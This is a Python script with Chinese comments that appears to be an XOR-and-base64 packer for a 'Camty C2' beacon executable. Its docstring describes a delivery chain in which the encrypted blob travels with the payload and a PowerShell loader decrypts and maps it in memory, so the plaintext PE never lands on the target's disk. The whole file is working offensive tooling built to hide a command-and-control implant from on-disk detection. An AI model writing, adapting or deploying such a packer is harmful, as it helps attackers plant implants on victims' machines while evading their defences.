"""XOR 加密打包器：beacon.exe → base64(XOR(exe))，配合 invoke_pe.ps1 无文件加载。

用法：
  python pack_xor.py beacon.exe packed.b64 --key camty
交付链：明文 PE 不落目标盘——加密 blob 随载荷分发，loader 内存解密映射。
"""

import argparse
import base64
import sys
from pathlib import Path


def pack(src: Path, dst: Path, key: str) -> int:
    data = src.read_bytes()
    kb = key.encode("utf-8")
    if not kb:
        raise SystemExit("key 不能为空")
    out = bytes(b ^ kb[i % len(kb)] for i, b in enumerate(data))
    blob = base64.b64encode(out).decode("ascii")
    dst.write_text(blob, encoding="ascii")
    return len(data)


def unpack(blob: str, key: str) -> bytes:
    kb = key.encode("utf-8")
    raw = base64.b64decode(blob)
    return bytes(b ^ kb[i % len(kb)] for i, b in enumerate(raw))


def main(argv: list[str] | None = None) -> None:
    parser = argparse.ArgumentParser(prog="pack-xor", description="Camty C2 无文件加载打包器")
    parser.add_argument("src", help="输入 PE（beacon.exe）")
    parser.add_argument("dst", help="输出 base64 blob 文件")
    parser.add_argument("--key", default="camty", help="XOR key（与 invoke_pe.ps1 -Key 一致）")
    parser.add_argument("--verify", action="store_true", help="打包后解密回读校验")
    args = parser.parse_args(argv)
    src, dst = Path(args.src), Path(args.dst)
    n = pack(src, dst, args.key)
    if args.verify:
        restored = unpack(dst.read_text(encoding="ascii"), args.key)
        if restored != src.read_bytes():
            raise SystemExit("校验失败：解密与原文不一致")
        if not restored.startswith(b"MZ"):
            raise SystemExit("校验失败：解密后非 PE")
        print(f"打包+校验 OK（{n} 字节，MZ 头确认）")
    print(f"{src.name} -> {dst}（{n} 字节，key={args.key}）")


if __name__ == "__main__":
    main(sys.argv[1:])
